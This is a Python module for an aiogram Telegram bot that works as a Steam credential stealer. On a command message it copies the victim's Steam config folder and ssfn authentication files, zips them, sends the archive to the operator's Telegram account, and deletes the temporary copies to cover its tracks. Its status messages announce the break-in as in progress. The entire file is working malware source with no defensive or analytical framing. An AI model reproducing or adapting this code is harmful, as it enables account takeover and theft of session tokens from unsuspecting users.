
import os
import shutil
from aiogram import types

path2 = r'C:\Program Files\Steam'
path02 = r'C:\Program Files\Steam\config'
path3 = r'C:\Program Files (x86)\Steam'
path03 = r'C:\Program Files (x86)\Steam\config'


directory = r'C:\hesoyam8927163\Steam\\config'
directory2 = r'C:\hesoyam8927163\Steam'


def Steam(dp, bot, admin_id):
    @dp.message_handler(text_contains='Л0ГИ STEAM')
    async def steam(message: types.Message):
        await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
        try:
            try:
                files2 = [i for i in os.listdir(path2) if os.path.isfile(os.path.join(path2,i)) and \
                 'ssfn' in i]
                shutil.copytree(path02, directory)
                shutil.copy(path2+'\\'+files2[0], directory2)
                shutil.copy(path2+'\\'+files2[1], directory2)
            except Exception as e:
                print(e)
            try:
                files3 = [i for i in os.listdir(path3) if os.path.isfile(os.path.join(path3,i)) and \
                 'ssfn' in i]
                shutil.copytree(path03, directory)
                shutil.copy(path3+'\\'+files3[0], directory2)
                shutil.copy(path3+'\\'+files3[1], directory2)
            except Exception as e:
                print(e)

            
            try:
                shutil.make_archive('steam', 'zip', 'C:\\hesoyam8927163\\Steam')
                await bot.send_document(admin_id, open('steam.zip', 'rb'))
                os.remove('steam.zip')
                shutil.rmtree('C:\\hesoyam8927163')
            except Exception as e:
                await bot.send_message(admin_id, e)
        except:
            await bot.send_message(admin_id, 'N! SINGAQ.')
